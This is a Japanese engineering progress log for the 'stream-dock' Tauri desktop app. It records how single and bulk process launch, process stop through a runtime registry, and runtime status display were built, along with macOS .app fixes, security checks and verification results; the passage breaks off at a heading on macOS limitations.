### やっていないこと（今回スコープ外・据え置き）

- 確認範囲を「毎回の削除」へ広げること（ユーザー回答＝最後の1つのみ、で確定）
- git commit は未実施（指示があってから）

## 2026-07-07 (007 Process Launch)

### 完了したこと

- 登録済み Tool を stream-dock から**単体で実プロセス起動**できるようにした（一括起動・停止・状態監視・`.lnk`/`.bat` 対応・起動状態管理の本格化は 007 スコープ外）
- OS プロセス操作が初めて入るため `docs/security.md` を最優先。**shell 非経由**で保存済み `executablePath` を直接起動し、frontend からは `toolId` のみを渡す設計にした
- 起動ロジックは **Rust 新規 `src/process/` モジュール**（`architecture.md` の ProcessService に対応）に置いた。DB テーブルを持たないため `repository.rs` は作らず、`mod`/`model`/`service`/`commands` の3+1構成
- Tauri command 1本を実装: `launch_tool`（薄いラッパ。引数は既存 `get_tool`/`delete_tool` に合わせ `id`）。DB は 004〜006 と同じ `Mutex<Connection>` State（`tools::commands::DbState`）を再利用
- **DB ロックは Tool 取得だけで解放し、プロセス spawn 中は保持しない**（`command` 内で Tool を取得→ロック解放→`process::service::launch(&tool)`）
- Rust 側の起動時検証（`process::service::launch`）: `executablePath` が 空でない / 絶対パス / 実在 / 非ディレクトリ / `.lnk`・`.bat` でない、を確認してから `std::process::Command::new(path).spawn()`。`toolId` 空チェックと Tool 存在チェック（既存 `tools::service::get` で NotFound）は command 側
- PID の扱い（009 Process Stop 準備）: 起動成功時に `LaunchToolResult { toolId, processId, startedAt }` を返す（**PID を返すだけ**。起動記録の永続ストアは 007 では作らない）
- エラーは frontend で表示可能な安全な形に限定。`spawn()` 失敗の生 OS エラー文字列は露出させず、`AppError::LaunchFailed("プロセスの起動に失敗しました")` の固定メッセージに丸める（環境情報を漏らさない）
- React 側: `features/tools/toolApi.ts` に `launchTool(id)` を追加（**各コンポーネントは invoke を直接呼ばず API wrapper 経由**）。メイン画面の擬似 `handleStart`（`setTimeout` シミュレーション）を実起動に差し替え。起動中は行のボタンが Spinner に置換され自動的に disabled、成功で `running` ＋成功メッセージ、失敗で `error` ＋ `toErrorMessage(e)` をインライン表示（トースト機構が無いため既存 `.error` イディオムに倣い成功/失敗の2クラスを CSS に追加）。失敗後の行は `error` 状態から再び起動ボタンが出るためリトライ可能

### 追加ライブラリ

- なし（`std::process::Command`（std）のみ。既存 rusqlite / uuid / chrono / ts-rs を再利用。新規依存・新規 Tauri plugin なし）

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: 新規 `src/process/{mod,model,service,commands}.rs` / 変更 `src/lib.rs`（`mod process;` ＋ handler に `launch_tool` 登録）・`src/error.rs`（`LaunchFailed` variant ＋ Display 追加）
- Frontend（`apps/desktop/src/`）: 生成物 `features/tools/bindings/LaunchToolResult.ts`（＋ `AppError.ts` 再生成）/ 変更 `features/tools/types.ts`（`LaunchToolResult` re-export）・`features/tools/toolApi.ts`（`launchTool` 追加）・`screens/main/MainScreen.tsx`（実起動 ＋ フィードバック）・`screens/main/MainScreen.module.css`（`.launchSuccess`/`.launchError` 追加）

### 起動結果 model / 型

- API/JSON は camelCase: `LaunchToolResult { toolId: string, processId: number, startedAt: string }`（ts-rs で Rust から自動生成）。DB スキーマ変更なし

### 検証結果

- `cargo check` 成功
- `pnpm gen:bindings`（`cargo test export_bindings`）成功（12 tests ok。`LaunchToolResult` 新規 ＋ `AppError` 再生成）
- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功（57 modules）
- ※ `pnpm tauri dev` の GUI 実機 E2E（実在する実行ファイルを登録→プリセット追加→行の起動ボタンで実アプリ起動＋成功メッセージ／存在しない・ディレクトリ・.bat で失敗メッセージ／起動中 Spinner 無効化／004〜006 非破壊）は表示環境が必要なため未実施。次回セッション冒頭またはユーザー環境での確認を推奨
- ※ `check:bindings` は生成物が未コミットのため diff で exit 1（＝生成は最新・コミット前という想定どおり）。コミット時に bindings 差分を含める

### セキュリティ確認（docs/security.md 準拠 / 実装後に security-review 実施予定）

- shell 非経由（`std::process::Command` 直接・`cmd /C` / `sh -c` なし・文字列連結でコマンド生成なし）
- frontend からは `toolId` のみ。任意パス・任意コマンドを渡せない。Tool の取得と `executablePath` 検証は Rust 側で実施
- `run_command` / `execute_shell` / `write_file` / `delete_path` / `launch_path` / `launch_command` 等の汎用危険 command を追加していない
- Tauri capabilities / permissions 変更なし（自作 command は `core:default` でカバー。shell/opener/fs プラグイン権限を追加していない）
- エラーメッセージに環境変数・機密情報を含めない（`LaunchFailed` は固定文言）
- 004/005/006 のデータ・既存機能を壊さず、command 1本と Rust モジュール1つを追加するのみ

### やっていないこと（今回スコープ外・据え置き）

- プリセット内ツールの一括起動（`launchAll` は擬似のまま）・ordered/parallel に従った起動制御
- プロセス停止（メイン画面の running 行「停止」ボタンは UI 状態リセットのみで実 kill しない → 009 で実装）・起動状態監視
- 起動記録の永続ストア（PID を返すのみ。009 Process Stop で追加検討）
- `.lnk` 実体パス解決・`.bat` 対応・アイコン自動抽出
- Sidebar のツール一覧・ピッカーへの起動ボタン追加
- git commit は未実施（指示があってから）

## 2026-07-07 (007 E2E 修正: macOS `.app` 起動 & 一括ボタン誤ローディング)

### 背景

macOS 上で 007 の E2E 検証中に 2 件の不具合が判明した。

1. **単体起動ボタンを押してもアプリが起動しない。** 当初は Tauri/Rust の権限不足を疑ったが誤り（自作 command `launch_tool` は capabilities/ACL の権限を要求せず、既存 command と同様に到達可能）。真因は macOS 固有: ツール登録のファイル選択（`open({ directory: false })`）で macOS アプリを選ぶと `.app` バンドル＝**ディレクトリ**のパス（例 `/Applications/OBS.app`）が保存され、`process::service::launch` が `path.is_dir()` で `Validation("指定されたパスはディレクトリです")` を返して起動に到達しなかった。仮に通しても `std::process::Command::new("/…/OBS.app").spawn()` はバンドルを exec できない。007 が Windows 前提（`.exe`/`.lnk`/`.bat`）で設計され、macOS の `.app` 起動が未対応だった。
2. **単体起動時に右上の「一括起動」ボタンまでローディング（Spinner + disabled）になる。** 一括ボタンが `launching || anyStarting` を条件にしており、単体起動 `handleStart` が対象行を `"starting"` にすると `anyStarting` が true になって巻き込まれていた。

### 完了したこと

- **macOS `.app` 起動対応（`open` 経由）**: `process::service::launch` に `#[cfg(target_os = "macos")]` 分岐を追加。拡張子 `app` のディレクトリを「起動可能」と判定し、固定の絶対パス `/usr/bin/open` にバンドルパスを**配列引数**（shell 非経由・文字列連結なし＝security.md 準拠）で渡して LaunchServices 起動する。`.app` 以外のディレクトリは従来どおり拒否。`.lnk`/`.bat` 拒否は通常ファイル経路のみに適用。Windows/Linux の直接 spawn 経路は cfg で不変。
  - **PID の注意（009 申し送り）**: `open` 経由のため返る `processId` は実アプリではなく即座に終了する `open` ヘルパの PID。007 要件「起動成功時に PID を取得できる」は満たすが、009 Process Stop では macOS で実アプリ PID を別途取得する方式が必要。`service.rs`／`model.rs` の既存 TODO に明記した。
- **一括ボタン誤ローディング修正**: `MainScreen.tsx` の一括起動ボタンの `disabled` / Spinner 条件を `launching || anyStarting` から **`launching` のみ**（disabled は `launching || isEmpty`）に変更し、未使用化した `anyStarting` を削除。単体起動のローディングは対象行の `ToolRow`（`state === "starting"` の Spinner）のみが担当する挙動に是正。

### 変更したファイル

- Rust: `apps/desktop/src-tauri/src/process/service.rs`（`.app` 判定 ＋ `open` 経由起動 ＋ TODO 追記）・`src/process/model.rs`（PID TODO に macOS 注記追記）
- Frontend: `apps/desktop/src/screens/main/MainScreen.tsx`（`anyStarting` 削除・一括ボタン条件修正）

### 触っていないもの

- `error.rs`／型（bindings）変更なし → ts-rs 再生成不要。`capabilities/default.json` 変更なし。新規 crate・plugin・command・DB スキーマ追加なし。004/005/006 のデータ・機能は不変。

### 検証結果

- `cargo check` 成功
- `pnpm typecheck` 成功（exit 0）
- `pnpm lint` 成功（exit 0 / warning なし）
- ※ `pnpm tauri dev` の macOS 実機 E2E（`.app` 登録→単体起動で実アプリ起動／単体起動中に一括ボタンが非ローディングのまま／一括起動で一括ボタンのみ Spinner／存在しないパス・非 .app ディレクトリ・.bat のエラー）はユーザー環境での確認を推奨

### セキュリティ確認（docs/security.md 準拠 / process 起動処理変更のため security-review 推奨）

- shell 非経由（`/usr/bin/open` は固定絶対パス、バンドルパスは配列引数で渡し文字列連結なし）
- frontend からは `toolId` のみ。任意パス・任意コマンドは起動できない（Tool 取得・検証は Rust 側）
- 汎用危険 command 追加なし／capabilities 変更なし／外部通信追加なし

## 2026-07-07 (007 不具合修正: 単体起動後もUIが「起動中」のまま終わらない)

### 背景

macOS の実機 E2E で、`/Applications` 配下の LINE（`.app` バンドル）を登録して単体起動すると、
**実アプリは起動するのに、メイン画面の行が「起動中」（Spinner）のまま永久にローディングが終わらない**症状を確認。
直前の `.app` 起動対応で Rust 側の起動が成功するようになった結果、今度は「起動成功後のフロント状態遷移」の別バグが表面化した。

### 根本原因（Rust 側ではなくフロント側）

Rust の `launch_tool` → `process::service::launch` は正常に spawn して `LaunchToolResult` を返しており、
`launchTool()` の Promise は解決している。問題は解決後のフロント状態更新が握りつぶされていた点。

`MainScreen.tsx` の `mountedRef` が典型的な **React 18 StrictMode アンチパターン**になっていた。
cleanup で `mountedRef.current = false` にするが、effect 本体で `true` に戻していなかったため、
`pnpm tauri dev`（dev モード＝`<React.StrictMode>` 有効）の effect 二重実行（mount→unmount→remount）で
`mountedRef.current` が**恒常的に false** に固定される。その結果 `handleStart` の
`await launchTool()` 解決後に `if (!mountedRef.current) return;` で早期 return し、状態が `"starting"` から動かなくなっていた。
成功側（running）も失敗側（error）も同じ早期 return で握りつぶされ、一括起動 `launchAll` の途中判定も同様に影響を受けていた。
※ dev モード限定（本番ビルドでは StrictMode は effect を二重実行しないため再現しない）だが、検証は `pnpm tauri dev` で行うため実質必ず踏む。

### 完了したこと

- `MainScreen.tsx` の mount 用 `useEffect` 本体先頭に `mountedRef.current = true;` を追加し、StrictMode 再マウント後も mounted 判定が true に復帰するようにした（フロント1ファイル・1行の追加）。
- これにより単体起動成功後に `running`＋成功メッセージへ、失敗時は `error`＋エラーメッセージへ正しく到達し、一括起動の途中判定も正常化する。

### 触っていないもの

- Rust 側（`process/` モジュール・`service.rs` の `.app` 起動ロジック・`launch_tool` command）は正常なため変更なし。
- 型/bindings・`capabilities`・DB スキーマ・依存追加なし。
- `.app` 経由起動で返る PID が `open` ヘルパの PID である件は 009 の申し送り事項で本不具合とは無関係のため対象外。

### 検証結果

- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- ※ `pnpm tauri dev` の macOS 実機 E2E（`.app` 単体起動で行が「起動中」→「起動済み」へ遷移し成功メッセージ表示／存在しないパス・非 .app ディレクトリ・.bat でエラー表示＋再起動ボタン復帰／一括起動でも各行が起動済みまで進む）はユーザー環境での確認を推奨

## 2026-07-07 (007 UX調整: 単体起動ステータスを「起動済み」→「起動中(継続)」に変更)

### 背景

単体起動で spawn 成功と同時に行が「起動済み」になるが、実アプリはまだ初期ローディング中で「起動成功(完了)」の断定が実態とズレて直感に反する、というユーザー指摘。

### 技術的前提（不可能な理由）

「アプリの初期ローディングが完全に終わったタイミング」の正確な検知は実質不可能。

- 「準備完了」はアプリ内部状態で、OS に汎用シグナルが無い。
- プロセス生存確認はローディング中もずっと true なので早期化を解消しない（かつ macOS `.app` は `/usr/bin/open` 経由で実 PID を持たない＝追跡は 009 相当の追加実装が必要）。
- macOS の `isFinishedLaunching` 等は AppKit 起動完了時点で早期発火し、ローディング完了とは一致しない（＋新規ネイティブ依存が必要）。

### 完了したこと（フロントのみ・小規模）

- 完了断定の「起動済み」への自動遷移をやめ、単体起動は spawn 成功後「起動中」を**到達点（resting 状態）**として表示する方針に変更（ユーザー確定）。
- 新しい表示状態 `"launched"`（バッジ文言「起動中」）を追加。単体起動の遷移を `waiting → starting(Spinner=起動要求送信中) → launched(起動中の継続表示・開く/停止ボタン表示)` に変更。失敗は従来どおり `error`。
- `starting` と `launched` はバッジ文言が同じ「起動中」で、Spinner → resting の遷移中もバッジ表示が途切れず自然につながる。完了断定の `running`（起動済み）へは単体起動では遷移しない（009 の実監視用に温存）。

### 変更したファイル（`apps/desktop/src/`）

- `types.ts`（`ToolState` に `"launched"` 追加）
- `components/primitives.tsx`（`STATUS_LABELS` に `launched: "起動中"`）
- `components/primitives.module.css`（`.status.starting` セレクタを `.launched` にも適用＝同じ見た目を流用・新規色なし）
- `screens/main/ToolRow.tsx`（「開く／停止」の表示条件を `running` に加え `launched` でも出す。`starting` の Spinner 分岐は不変）
- `screens/main/MainScreen.tsx`（`handleStart` 成功時を `running` → `launched`。成功メッセージ「◯◯ を起動しました」は維持）

### 触っていないもの（スコープ限定）

- 進捗テキスト `N / M 起動済み`（完了断定しない方針なので起動した行を「起動済み」に数えないのは整合的＝変更なし）
- 一括起動 `launchAll` / `一括停止`（007 では疑似シミュレーションのまま。`running` 遷移・`allRunning` ロジックも不変）
- 「停止」ボタンの挙動（007 どおり UI 状態リセットのみ。実 kill は 009）
- Rust 側 / 型 bindings / capabilities / 依存（`ToolState` はフロント専用 UI 型のため bindings 再生成不要）

### 検証結果

- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- ※ `pnpm tauri dev` の macOS 実機 E2E（起動ボタン→一瞬 Spinner→実アプリ起動でバッジ「起動中」のまま留まり「開く／停止」表示＋成功メッセージ／「停止」で待機中へ戻りリトライ可／存在しないパス・非 .app・.bat でエラー）はユーザー環境での確認を推奨

### 申し送り（009）

- 実プロセス監視（macOS は実アプリ PID 解決を含む）を入れたら `launched`（起動中）→ プロセス稼働確認で `running`（「稼働確認済み」に再定義）へ遷移させる余地を残す。ただしそれでも「初期ローディング完了」の厳密検知ではない点は変わらない。

## 2026-07-07 (008 Bulk Launch)

### 完了したこと

- 選択中 Preset に紐づく **enabled な PresetItem をまとめて実プロセス起動**できるようにした（停止・状態監視・起動完了検知・`.lnk`/`.bat` 対応は 008 スコープ外＝009 以降）
- 007 の単体起動サービス **`process::service::launch(&Tool)` をそのまま再利用**（`&Tool` のみを取り DB 非依存）。008 では PresetItem の取得・並び替え・起動順制御・結果集約を上に載せた
- Tauri command 1本 `launch_preset(db, preset_id)` を追加（薄いラッパ）。**frontend からは presetId のみ**を渡し、Preset / PresetItem / Tool の取得と executablePath 検証はすべて Rust 側で実施。DB は 004〜007 と同じ `Mutex<Connection>` State（`tools::commands::DbState`）を再利用
- **DB ロックは起動対象の解決だけで解放し、spawn 中は保持しない**（007 の `launch_tool` と同方針）。command 内で `resolve_preset_targets` → ロック解放 → `launch_preset_targets`（DB 非依存）で spawn
- **起動順（MVP）**: enabled な ordered を orderIndex 昇順で先に → enabled な parallel を後にまとめて起動。`std::process::Command::spawn()` は子の終了を待たない非ブロッキング呼び出しのため、順に spawn しても起動アプリ群は同時並行に走る（**スレッド・新規依存なし**）
- **開始前 abort（一括起動自体を始めない）**: presetId 空 / Preset 不在（`NotFound`）/ enabled な PresetItem が0件（`Validation`）。それ以外は best-effort で、1件の失敗では全体を止めず成功・失敗を集約
- **結果モデル**を追加（ts-rs 生成）: `BulkLaunchPresetResult { presetId, startedAt, finishedAt, totalCount, successCount, failureCount, results }` ＋ `BulkLaunchToolResult { presetItemId, toolId, toolName, launchMode, orderIndex, success, processId?, startedAt?, errorMessage? }`。起動成功ごとに `processId` を含む
- **エラー文言の安全化**: bulk 結果の `errorMessage` は `safe_launch_message` でフロント表示に安全な短文へ丸める。特に `AppError::PathNotFound` はメッセージにフルパスを含むため、パスを出さない固定文言（「指定された実行ファイルが見つかりません」）に置換（環境情報・パスを露出しない）
- React 側: `features/presets/presetLaunchApi.ts`（`launchPreset(presetId)` 薄ラッパ）を追加し、**コンポーネントは invoke を直接呼ばず API wrapper 経由**。メイン画面の疑似 `launchAll`（`setTimeout` シミュレーション）を実起動へ差し替え。起動中は一括起動ボタンが Spinner＋disabled、`res.results` を `presetItemId`（= 行 id）で各行に反映（成功→`launched`、失敗→`error`）。成功／一部失敗（warning）／全失敗（error）でフィードバック文言を出し分け、失敗ツール名を表示。enabled な item が0件・未選択のときは一括起動ボタンを disabled

### 追加ライブラリ

- なし（`std::process::Command`（std）のみ。既存 rusqlite / uuid / chrono / ts-rs を再利用。新規 crate・plugin・npm package なし）

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: 変更 `src/process/model.rs`（`BulkLaunchPresetResult` / `BulkLaunchToolResult` 追加）・`src/process/service.rs`（`resolve_preset_targets` / `launch_preset_targets` / `launch_one` / `safe_launch_message` 追加、007 の `launch` は不変）・`src/process/commands.rs`（`launch_preset` command 追加）・`src/lib.rs`（handler に `launch_preset` 登録）
- Frontend（`apps/desktop/src/`）: 生成物 `features/presets/bindings/BulkLaunchPresetResult.ts` / `BulkLaunchToolResult.ts` / 新規 `features/presets/presetLaunchApi.ts` / 変更 `features/presets/types.ts`（bulk 結果型を re-export）・`screens/main/MainScreen.tsx`（実一括起動・`hasEnabled` による disabled・warning フィードバック・不要になった `sleep` 撤去）・`screens/main/MainScreen.module.css`（`.launchWarning` 追加）

### 検証結果

- `cargo test export_bindings` 成功（14 tests ok。`BulkLaunchPresetResult` / `BulkLaunchToolResult` を新規生成、`LaunchMode` を同ディレクトリ import で参照）
- `cargo check` 成功
- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功（58 modules）
- ※ `check:bindings` は生成物が未コミットのため diff で exit 1（＝生成は最新・コミット前という想定どおり）。コミット時に bindings 差分を含める
- ※ `pnpm tauri dev` の実機 E2E（複数ツールのプリセットで一括起動→ ordered 順→ parallel 起動／成功・一部失敗（warning＋失敗ツール名）・全失敗（error）／起動中ボタン disabled＋Spinner／enabled 0件・未選択で起動不可／004〜007 非破壊）は表示環境が必要なためユーザー環境での確認を推奨

### セキュリティ確認（docs/security.md 準拠 / process 起動処理変更のため security-review 推奨）

- shell 非経由（007 の `launch` を再利用＝`std::process::Command` 直接・`cmd /C` / `sh -c` なし・文字列連結でコマンド生成なし）
- frontend からは presetId のみ。任意パス・任意コマンド・起動引数・working directory を渡せない。Preset / PresetItem / Tool 取得と executablePath 検証は Rust 側
- `run_command` / `execute_shell` / `launch_path` / `bulk_launch_paths` 等の汎用危険 command を追加していない（限定的な `launch_preset` のみ）
- Tauri capabilities / permissions 変更なし（自作 command は `core:default` でカバー）
- `errorMessage` に環境変数・フルパス・スタックトレースを出さない（`safe_launch_message` で丸め）
- 004〜007 のデータ・既存機能を壊さず、command 1本とモデル2つ・フロント wrapper 1つを追加するのみ

### やっていないこと（今回スコープ外・据え置き）

- プロセス停止（一括停止ボタンは bulk 起動では `launched` 止まりで `allRunning` にならず「一括起動」のまま。実 kill は 009）・起動状態監視・死活監視・自動リトライ
- 起動完了検知・アプリ初期ローディング完了検知・ツールごとの起動待機秒数・launch group
- 起動記録の永続ストア（processId を結果に含めるのみ。009 で PID 管理を検討。macOS `.app` の PID は `open` ヘルパのものである件は 007 からの申し送りどおり）
- `.lnk` 実体パス解決・`.bat` 対応・アイコン自動抽出
- git commit は未実施（指示があってから）

## 2026-07-07 (009 Process Stop)

### 完了したこと

- stream-dock 経由で起動したプロセスだけを**安全に停止**できるようにした（raw PID ではなく Rust 側 registry が保持する `std::process::Child` ハンドル経由で停止）。frontend からは `launchId` / `presetId` のみを渡し、任意 PID・path・command・shell 経由の停止はしない（docs/security.md §6 準拠）
- Rust に **runtime process registry** を新設（`process/registry.rs`）。`ManagedProcess { launch_id, tool_id, tool_name, preset_id, preset_item_id, process_id, started_at, child }` を `Mutex<HashMap<launchId, ManagedProcess>>`（`ProcessRegistry`）で current session 限定に保持。`app.manage` で State 共有。`launchId` は Rust 側で `uuid::Uuid::new_v4()` 採番（既存依存を再利用・新規 crate なし）
- 007 の `process::service::launch`（Child を drop していた）を **`spawn(&Tool) -> AppResult<Child>`** に置き換え、Child を drop せず返す形にした（**検証・macOS `.app` の `/usr/bin/open` 起動経路は 007/008 から変更しない**＝起動処理は不変）。`launch_tool` command で spawn 成功後に registry 登録し、`LaunchToolResult` に `launchId` を含める
- 008 の `launch_preset_targets` / `launch_one` に `registry` を配線し、spawn 成功ごとに `ManagedProcess`（`preset_id`/`preset_item_id` 付き）を登録。`BulkLaunchToolResult` に `launchId`（成功時のみ Some）を追加
- Tauri command 2本を追加（既存 `launch_tool`/`launch_preset` 命名に合わせて確定）:
  - `stop_process(registry, launchId)`: registry から `remove` → `service::stop_one` で停止 → 停止失敗時のみ registry へ戻して再試行可能に。registry に無い launchId は `not-found` を返し何も停止しない
  - `stop_preset_processes(db, registry, presetId)`: presetId 空チェック → Preset 実在チェック（`presets::service::get`）→ registry を `preset_id` 一致で絞り込み → 各 `stop_one` → 集計（stopped / already-exited / failed 件数）。対象0件でも totalCount=0 の正常結果を返す
- **停止ロジック**（`service::stop_one`）: `child.try_wait()` で既終了なら `already-exited`、動作中なら `child.kill()` → `child.wait()` でゾンビ回収して `stopped`、失敗は `failed`。エラー文言は環境情報を出さない固定文言に丸める
- 結果モデル（ts-rs 生成）: `StopProcessResult { launchId, toolId, toolName, processId, status, stoppedAt?, errorMessage? }` ＋ enum `StopStatus`（kebab-case: `stopped` / `already-exited` / `not-found` / `failed`）＋ `StopPresetProcessesResult { presetId, stoppedAt, totalCount, successCount, alreadyExitedCount, failureCount, results }`
- React 側: API wrapper `stopProcess(launchId)`（`features/tools/toolApi.ts`）/ `stopPresetProcesses(presetId)`（`features/presets/presetLaunchApi.ts`）を追加し、**コンポーネントは invoke を直接呼ばず wrapper 経由**。`RuntimeItem` に `launchId` を追加し、単体/一括起動の成功結果から行に保持。`ToolState` に `"stopping"`（バッジ「停止中」）を追加
- UI 接続: 行の「停止」ボタンを実 `stopProcess` に配線（停止中は行が Spinner＋disabled）。停止成功=「◯◯ を停止しました」／既終了=「既に終了していました」／失敗=エラー文言＋起動中へ戻し再試行可。一括ボタンは起動中の行があるとき「一括停止」に切り替わり `stopPresetProcesses` を呼ぶ（進行中は Spinner＋disabled）。件数フィードバックを成功/一部失敗/対象なしで出し分け

### macOS `.app` の既知の縮退 & 013 への切り出し

- macOS の `.app` は 007/008 が `/usr/bin/open` 経由で起動するため、registry が掴む `Child` は即終了する `open` ヘルパで、**停止すると「既に終了済み」になり実アプリは止まらない**。009 では起動処理を変更しない方針（スコープを狭めて品質を上げる）とし、macOS `.app` の実停止対応は新タスク **013 macOS App Bundle Stop**（`docs/tasks/013-macos-app-stop.md`）に切り出した。Windows(`.exe`)/Linux の直接 spawn 経路では `Child` が実プロセスなので正しく停止できる（本命ターゲットは Windows）
- タスクボード: 013 に macOS App Bundle Stop を差し込み、既存を繰り下げ（Windows Build→014、User Test Package→015）

### 既知の制約（MVP・据え置き）

- メイン画面の `useEffect` は items 変更時に runtime を待機中へ再構築するため、起動後に Preset 構成を編集すると UI 側の `launchId` は失われ単体停止ボタンは消える。ただし Rust registry はプロセスを保持し続けるので、**Preset 単位停止（Rust 側で presetId 検索）では引き続き停止できる**

### 追加ライブラリ

- なし（`std::process::Child`（std）と既存 uuid / chrono / rusqlite / ts-rs を再利用。新規 crate・plugin・npm package なし）

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: 新規 `src/process/registry.rs` / 変更 `src/process/{mod,model,service,commands}.rs`・`src/lib.rs`（registry を `app.manage`・`mod registry`・stop command 2本を handler 登録）。`error.rs`・`capabilities/default.json` は**変更なし**
- Frontend（`apps/desktop/src/`）: 生成物 `features/tools/bindings/{StopProcessResult,StopStatus,LaunchToolResult}.ts`・`features/presets/bindings/{StopPresetProcessesResult,BulkLaunchToolResult}.ts` / 変更 `features/tools/{toolApi,types}.ts`・`features/presets/{presetLaunchApi,types}.ts`・`types.ts`・`components/primitives.{tsx,module.css}`・`screens/main/{MainScreen.tsx,ToolRow.tsx}`
- Docs: 新規 `docs/tasks/013-macos-app-stop.md` / 変更 `docs/task-board.md`（013 差し込み・009 を Done へ）・`docs/progress.md`（本記録）

### 検証結果

- `cargo check` 成功
- `pnpm --filter ./apps/desktop gen:bindings`（`cargo test export_bindings`）成功（17 tests ok。`StopProcessResult` / `StopStatus` / `StopPresetProcessesResult` 新規、`LaunchToolResult` / `BulkLaunchToolResult` 再生成）
- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功（58 modules）
- ※ `pnpm tauri dev` の実機 E2E（`.exe`/`.app` を起動→単体停止・Preset 単位停止／既終了→「既に終了済み」／registry 外 launchId・presetId の非停止／手動起動アプリを止めない／macOS `.app` は既知縮退どおり実アプリが止まらない／004〜008 非破壊）は表示環境が必要なためユーザー環境での確認を推奨
- ※ `check:bindings` は生成物が未コミットのため diff で exit 1（＝生成は最新・コミット前という想定どおり）。コミット時に bindings 差分を含める

### セキュリティ確認（docs/security.md 準拠 / process 停止処理追加のため security-review 推奨）

- 停止は `std::process::Child::kill()` のみ（`taskkill` / `kill` / `pkill` / `cmd /C` / `sh -c` / `powershell` なし・shell 非経由）
- frontend からは `launchId` / `presetId` のみ。任意 PID・path・command を渡せない。registry 未登録は停止しない。frontend から渡された launchId / presetId は Rust 側で検証（空チェック・registry/Preset 実在）
- `kill_pid` / `stop_pid` / `run_command` / `execute_shell` 等の汎用危険 command を追加していない（限定的な `stop_process` / `stop_preset_processes` のみ）
- Tauri capabilities / permissions 変更なし（自作 command は `core:default` でカバー）
- 停止結果の `errorMessage` は環境情報・パスを含まない固定文言に丸め
- プロセスツリー停止・graceful shutdown・常時死活監視（010 相当）は実装していない
- 004〜008 のデータ・既存機能を壊さず、command 2本・Rust モジュール1つ・フロント wrapper 2つを追加するのみ

### やっていないこと（今回スコープ外・据え置き）

- macOS `.app` の実プロセス停止（→ 013 macOS App Bundle Stop）
- 起動状態の常時監視・死活監視ループ・waiting/starting/running/stopping/stopped/error の本格的な状態管理（→ 010 Runtime Status）
- プロセスツリー全体の停止・graceful shutdown・アプリごとの安全な終了手順
- アプリ再起動後のプロセス復元（current session 限定。PID 再利用の危険があるため過去セッションは停止対象外）
- git commit は未実施（指示があってから）

## 2026-07-07 (010 Runtime Status)

### 完了したこと

- runtime process registry の**実状態を UI に反映**できるようにした。009 まで完全に楽観的（optimistic）だったメイン画面の状態バッジ／ボタン制御を、Rust 側 registry の `std::process::Child::try_wait()` 結果と突き合わせて更新する。対象は**現在のアプリ起動セッション中に stream-dock が registry に登録したプロセスのみ**（frontend から raw PID / path / command を渡さない・shell 不使用）
- Rust に **状態取得 command 2本**を追加（既存 `launch_*` / `stop_*` の命名規則に合わせて確定）:
  - `list_runtime_processes(registry)`: registry の全 managed process を `try_wait()` で確認し `Vec<RuntimeProcess>` を返す
  - `list_preset_runtime_processes(registry, presetId)`: presetId 空チェック後、`preset_id` 一致の managed process だけを同様に返す（単体起動 007 は `preset_id=None` のため含まれない）
- **状態判定は `try_wait()` のみ**（`service::snapshot`）: `Ok(None)`→`Running` / `Ok(Some(_))`→`Stopped`（`endedAt` 付与）/ `Err(_)`→`Error`（安全な短文の `errorMessage` 付与）。終了・エラーを検知した launchId は registry から除去して `Child` を drop（009 の「停止したら registry から消す」方針に合わせ、その応答で一度 `stopped` を返し以降は不在扱い）。`try_wait()` は非ブロッキングのため lock 保持のまま走査（kill/wait のようなブロッキング操作はしない）
- 状態モデル（ts-rs 生成）: enum `RuntimeProcessStatus`（lowercase: `running` / `stopped` / `error`＝Rust が try_wait で判定できる3状態のみ）＋ `RuntimeProcess { launchId, toolId, toolName, presetId?, presetItemId?, processId, status, startedAt, updatedAt, endedAt?, errorMessage? }`。009 で `#[allow(dead_code)]` にしていた `ManagedProcess.started_at` / `preset_item_id` を本タスクで使用（annotation を除去）
- React 側: API wrapper `features/presets/runtimeApi.ts`（`listRuntimeProcesses()` / `listPresetRuntimeProcesses(presetId)`）を追加し、**コンポーネントは invoke を直接呼ばず wrapper 経由**。`ToolState` に `"stopped"`（バッジ「停止済み」）を追加
- UI 反映（`MainScreen`）: `reconcile()` を新設し、**launchId を主キー**に registry 状態を各行へ写像（`running`→「起動済み」へ昇格し launchId 保持 / registry から消えた行→「停止済み」+ launchId 破棄）。構成再描画・プリセット切替で launchId を失った行も、一括起動由来なら **presetItemId で running プロセスに再関連付け**して復元。`starting` / `stopping` の操作送信中行は上書きしない。`mountedRef` / `presetIdRef` で stale 反映を破棄
- 再取得タイミング（ユーザー選択＝軽い polling＋明示再取得）: **マウント時 / 構成・プリセット切替時 / 単体起動成功後 / 一括起動成功後 / 単体停止後 / Preset 単位停止後**に明示再取得。加えてメイン画面表示中は**約4秒間隔の軽い polling**（`reconcile` は launchId 保持行が無ければ IPC しないため起動プロセスが無い間は no-op・外部通信なし・registry のプロセスのみ対象）。これにより stream-dock 外でプロセスが終了しても数秒以内に「停止済み」へ自動遷移
- ボタン制御: `ToolRow` は既存分岐（running/launched→開く＋停止、starting/stopping→Spinner、その他＝waiting/stopped/error→起動）で 010 の要件（waiting/stopped/error は再起動可・running は停止可・起動中/停止中は disabled）を満たすため**変更なし**。`StatusBadge` は state をそのまま描画するので `stopped` 追加だけで表示。進捗カウント「N / M 起動済み」と一括停止トグルは `launched`／`running` の両方を「起動中扱い」に合算

### macOS `.app` の既知の縮退（013 で対応予定・009 からの継続）

